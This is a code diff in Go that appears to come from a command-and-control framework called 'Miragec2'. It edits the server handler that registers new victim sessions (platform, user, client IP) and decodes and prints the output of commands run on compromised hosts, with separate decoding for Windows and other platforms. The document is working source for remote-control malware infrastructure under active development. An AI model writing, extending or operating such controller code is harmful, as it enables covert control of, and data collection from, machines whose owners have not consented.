@@ -54,9 +54,9 @@ func DeResult(w http.ResponseWriter, r *http.Request, intID int) {
 		parts := strings.Split(decodedMessage, "[Mirage]")
 		if parts[0] == "First Connection Miragec2" {
 			job.Platform = parts[1]
-			job.Processname = parts[2]
-			job.Processid = parts[3]
-			job.User = parts[4]
+			//job.Processname = parts[2]
+			//job.Processid = parts[3]
+			job.User = parts[2]
 			job.ClientIP = r.RemoteAddr
 			fmt.Printf("\n[+] Sessions %d Online: %s -> %s \n", intID, job.ClientIP, job.IPort)
 			fmt.Print("Mirage Control > ")
@@ -64,10 +64,19 @@ func DeResult(w http.ResponseWriter, r *http.Request, intID int) {
 	} else {
 		for id, result := range data {
 			encryptedMessage, _ := base64.StdEncoding.DecodeString(result)
-			decodedMessage := DecodeToUTF8(exchange.ResultDecode(encryptedMessage, key))
+			decodedMessage := ""
+			if job.Platform == "windows" {
+				decodedMessage = DecodeToUTF8(exchange.ResultDecode(encryptedMessage, key))
+			} else {
+				decodedMessage = exchange.ResultDecode(encryptedMessage, key)
+			}
 
-			//fmt.Printf("\n[+] Command ID: %d \n[-+] Result: --------------- \n%s%s%s[-+] Result: ---------------\n", id, Green, decodedMessage, Reset)
-			fmt.Printf("\n[+] Command ID: %d \n[-+] Result: --------------- \n%s[-+] Result: ---------------\n", id, decodedMessage)
+			if decodedMessage == "" {
+				fmt.Printf("\n[+] Command successfully executed.\n")
+			} else {
+				//fmt.Printf("\n[+] Command ID: %d \n[-+] Result: --------------- \n%s%s%s[-+] Result: ---------------\n", id, Green, decodedMessage, Reset)
+				fmt.Printf("\n[+] Command ID: %d \n[-+] Result: --------------- \n%s[-+] Result: ---------------\n", id, decodedMessage)
+			}
 
 		}
 		fmt.Print("Mirage Control -> Session" + strconv.Itoa(intID) + " > ")
